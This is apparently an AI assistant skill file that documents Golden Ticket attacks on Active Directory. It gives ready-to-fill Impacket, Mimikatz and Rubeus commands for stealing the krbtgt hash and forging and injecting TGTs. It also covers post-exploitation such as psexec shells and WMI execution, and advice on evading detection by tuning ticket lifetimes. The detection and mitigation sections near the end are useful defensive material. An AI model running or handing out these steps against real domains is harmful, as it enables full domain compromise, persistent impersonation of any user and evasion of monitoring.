---
name: golden-ticket-ad
description: How to create and use Golden Ticket attacks in Active Directory environments. Use this skill whenever the user mentions Golden Tickets, TGT forgery, krbtgt hash, Kerberos ticket attacks, or needs to understand how to forge TGTs for authorized penetration testing. Also use when discussing Kerberos abuse, AD credential attacks, or when the user needs to create legitimate-looking TGTs for security assessments.
---

# Golden Ticket Attack Methodology

A **Golden Ticket** attack involves creating a legitimate-looking **Ticket Granting Ticket (TGT)** that impersonates any user by using the **NTLM hash of the Active Directory krbtgt account**. This technique enables access to any service or machine within the domain as the impersonated user.

## Key Concepts

- **krbtgt account credentials are never automatically updated** - once compromised, the hash remains valid indefinitely
- Golden Tickets are **forged offline** - no interaction with domain controllers required
- Requires **domain admin privileges** or equivalent access to obtain the krbtgt hash
- **AES encryption keys (AES128/AES256)** are strongly recommended over RC4/NTLM for operational security

## Acquiring the krbtgt Hash

To create a Golden Ticket, you first need the NTLM hash of the krbtgt account. Common methods:

### 1. LSASS Process Extraction
Extract from the Local Security Authority Subsystem Service on a Domain Controller.

### 2. NTDS.dit File
Extract from the NT Directory Services database on any Domain Controller.

### 3. DCsync Attack
Use tools like:
- **Mimikatz** `lsadump::dcsync` module
- **Impacket** `secretsdump.py` script

## Creating Golden Tickets

### Using Impacket (Linux)

```bash
# Generate the ticket
python ticketer.py -nthash <krbtgt_hash> \
  -domain-sid <domain_sid> \
  -domain <domain_name> \
  <username>

# Export the ticket
export KRB5CCNAME=/path/to/<username>.ccache

# Use the ticket with psexec
python psexec.py <domain>/<username>@<target> -k -no-pass
```

### Using Mimikatz (Windows)

```powershell
# Basic Golden Ticket with RC4
kerberos::golden /User:<username> \
  /domain:<domain> \
  /sid:<domain_sid> \
  /krbtgt:<krbtgt_hash> \
  /id:500 \
  /groups:512 \
  /startoffset:0 \
  /endin:600 \
  /renewmax:10080 \
  /ptt

# Using AES256 (recommended for OpSec)
kerberos::golden /user:<username> \
  /domain:<domain> \
  /sid:<domain_sid> \
  /aes256:<aes256_key> \
  /ticket:<output_file>.kirbi

# Load ticket into memory
kerberos::ptt <ticket_file>.kirbi

# List tickets in memory
klist
```

### Using Rubeus (Windows)

```powershell
# Generate Golden Ticket with LDAP lookup
.\Rubeus.exe asktgt /user:<username> \
  /rc4:<krbtgt_hash> \
  /domain:<domain> \
  /sid:<domain_sid> \
  /ptt \
  /ldap \
  /printcmd

# Load existing ticket
.\Rubeus.exe ptt /ticket:<ticket_file>.kirbi

# List tickets
klist
```

## Parameter Reference

| Parameter | Description | Example |
|-----------|-------------|---------|
| `/User` | Username to impersonate | `Administrator` |
| `/domain` | Target domain | `corp.local` |
| `/sid` | Domain SID | `S-1-5-21-1234567890-1234567890-1234567890` |
| `/krbtgt` | NTLM hash of krbtgt | `25b2076cda3bfd6209161a6c78a69c1c` |
| `/aes256` | AES256 key (preferred) | `430b2fdb13cc820d73ecf123dddd4c9d...` |
| `/id` | User RID | `500` (Administrator) |
| `/groups` | Group RIDs | `512` (Domain Admins) |
| `/startoffset` | Start time offset (minutes) | `0` |
| `/endin` | Ticket lifetime (minutes) | `600` (10 hours) |
| `/renewmax` | Max renewal time (minutes) | `10080` (7 days) |
| `/ptt` | Pass-the-Ticket (inject to memory) | (flag) |

## Post-Exploitation

Once the Golden Ticket is injected into memory:

1. **Access shared files** - C$ administrative shares
2. **Execute services** - Create and run services
3. **WMI execution** - Use WMI for remote code execution
4. **PsExec** - Use psexec or wmiexec for shells

**Note:** WinRM typically won't work with Golden Tickets.

## Detection and Evasion

### Common Detection Methods

1. **Kerberos Traffic Inspection**
   - Default Mimikatz tickets are valid for **10 years** - highly anomalous
   - Look for unusual ticket lifetimes in Kerberos traffic

2. **Event Log Correlation**
   - **Event 4769** (TGS request) without prior **Event 4768** (TGT request)
   - TGT lifetime is NOT logged in 4769 events
   - Correlate TGS requests that lack corresponding TGT issuance

3. **Sensitive Account Monitoring**
   - Alert on 4769 events for privileged accounts (Administrator, krbtgt)

### Evasion Techniques

**Control Ticket Lifetime:**
```powershell
# Check domain Kerberos policy
Get-DomainPolicy | select -expand KerberosPolicy

# Use realistic lifetimes in ticket creation
/startoffset:0 /endin:600 /renewmax:10080
```

**Diamond Tickets:**
For advanced evasion, consider Diamond Tickets which address the 4769/4768 correlation issue.

## Mitigation Strategies

### Monitoring

```powershell
# Monitor account logons
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4624} -MaxEvents 10

# Monitor admin logons
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 10 | Format-List

# Alert on TGS requests for sensitive accounts
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} | 
  Where-Object {$_.Message -match 'Administrator|krbtgt'}
```

### Defensive Measures

1. **Regularly rotate krbtgt password** - Requires twice (to invalidate existing tickets)
2. **Enable Kerberos pre-authentication**
3. **Monitor for 4769 without 4768** patterns
4. **Implement Kerberos ticket lifetime policies**
5. **Use AES encryption** - Avoid RC4/NTLM where possible
6. **Alert on privileged account TGS requests**

## References

- [How to Attack Kerberos - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [Kerberos Golden Tickets - IREd Team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

## Important Notes

- **Authorization Required**: Only use these techniques in authorized penetration testing engagements
- **OpSec Considerations**: AES encryption is preferred over RC4 for operational security
- **Detection Risk**: Golden Tickets are detectable with proper monitoring
- **krbtgt Rotation**: If compromised, rotate krbtgt password twice to invalidate all Golden Tickets
